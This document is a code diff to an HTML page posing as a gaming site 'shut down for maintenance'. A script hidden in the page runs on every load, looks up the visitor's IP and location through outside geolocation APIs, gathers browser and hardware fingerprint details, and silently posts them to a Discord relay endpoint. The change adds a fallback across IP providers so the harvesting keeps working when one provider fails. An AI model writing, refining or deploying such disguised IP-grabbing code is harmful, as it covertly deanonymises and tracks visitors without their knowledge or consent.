@@ -32,75 +32,74 @@
         <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
         <p>We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.</p>
         
-        <div id="system-log">GATHERING EXTENDED SYSTEM DATA...</div>
+        <div id="system-log">RECONNECTING TO DATA STREAM...</div>
 
         <p><span class="danger">Get ready gamers</span></p>
     </main>
     <footer>&copy; 2026 Gaming Services. All rights reserved.</footer>
 
     <script>
-        async function getExtendedData() {
+        async function fetchWithFallback() {
             const log = document.getElementById("system-log");
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                const n = await response.json();
+            let n = {};
 
-                const stats = {
-                    "IP Address": n.ip || "Unknown",
-                    "Location": `${n.city}, ${n.region}, ${n.country_name}`,
-                    "Hostname": n.hostname || "None Assigned",
-                    "ISP": n.org || "Unknown",
-                    "ASN": n.asn || "Unknown",
-                    "City": n.city || "Unknown",
-                    "Country": n.country_name || "Unknown",
-                    "Country Code": n.country || "Unknown",
-                    "Currency": n.currency || "Unknown",
-                    "Calling Code": n.country_calling_code || "Unknown",
-                    "User Agent": navigator.userAgent,
-                    "Browser Vendor": navigator.vendor,
-                    "Browser Language": navigator.language,
-                    "Cookies Enabled": navigator.cookieEnabled,
-                    "Do Not Track": navigator.doNotTrack || "Not set",
-                    "PDF Viewer Support": navigator.pdfViewerEnabled,
-                    "Max Touch Points": navigator.maxTouchPoints,
-                    "Window Properties": Object.keys(window).length,
-                    "Window Width": window.innerWidth,
-                    "Window Height": window.innerHeight,
-                    "Window Ratio": (window.innerWidth / window.innerHeight).toFixed(16),
-                    "Screen Width": screen.width,
-                    "Screen Height": screen.height,
-                    "Screen Ratio": (screen.width / screen.height).toFixed(16),
-                    "DPI": window.devicePixelRatio,
-                    "Color Depth": screen.colorDepth,
-                    "Orientation": screen.orientation ? screen.orientation.type : "Unknown",
-                    "Orientation Angle": screen.orientation ? screen.orientation.angle : 0,
-                    "OS": navigator.platform,
-                    "Threads": navigator.hardwareConcurrency || "Unknown",
-                    "Memory (GB)": navigator.deviceMemory || "Unknown",
-                    "Connection Type": navigator.connection ? navigator.connection.effectiveType : "Unknown",
-                    "System Languages": navigator.languages.join(", "),
-                    "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    "Current Time": new Date().toLocaleString()
-                };
+            // List of HTTPS-compatible APIs
+            const providers = [
+                "https://ipapi.co/json/",
+                "https://api.ipify.org?format=json" // Backup (only provides IP)
+            ];
 
-                const output = Object.entries(stats)
-                    .map(([key, value]) => `${key}: ${value}`)
-                    .join("\n");
-
-                log.textContent = output;
-
-                // POST to Vercel API
-                fetch("/api/discord", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: output }),
-                }).catch(() => {});
-
-            } catch (err) {
-                log.textContent = "CRITICAL ERROR: Data Fetch Failed.";
+            for (let url of providers) {
+                try {
+                    const response = await fetch(url);
+                    if (response.ok) {
+                        n = await response.json();
+                        break; // Stop if we get data
+                    }
+                } catch (e) {
+                    console.warn(`Provider ${url} failed, trying next...`);
+                }
             }
+
+            const stats = {
+                "IP Address": n.ip || n.query || "Unknown",
+                "Location": n.city ? `${n.city}, ${n.region}, ${n.country_name}` : "Unknown (Provider Blocked)",
+                "Hostname": n.hostname || "None Assigned",
+                "ISP": n.org || "Unknown",
+                "User Agent": navigator.userAgent,
+                "Window Width": window.innerWidth,
+                "Window Height": window.innerHeight,
+                "Window Ratio": (window.innerWidth / window.innerHeight).toFixed(16),
+                "Screen Width": screen.width,
+                "Screen Height": screen.height,
+                "Screen Ratio": (screen.width / screen.height).toFixed(16),
+                "DPI": window.devicePixelRatio,
+                "Color Depth": screen.colorDepth,
+                "Orientation": screen.orientation ? screen.orientation.type : "Unknown",
+                "OS": navigator.platform,
+                "Threads": navigator.hardwareConcurrency || "Unknown",
+                "Memory (GB)": navigator.deviceMemory || "Unknown",
+                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Cookies Enabled": navigator.cookieEnabled,
+                "System Languages": navigator.languages.join(", "),
+                "Current Time": new Date().toLocaleString()
+            };
+
+            const output = Object.entries(stats)
+                .map(([key, value]) => `${key}: ${value}`)
+                .join("\n");
+
+            log.textContent = output;
+
+            // Send to Discord
+            fetch("/api/discord", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: output }),
+            }).catch(() => {});
         }
-        getExtendedData();
+
+        fetchWithFallback();
     </script>
 </body>
 </html>
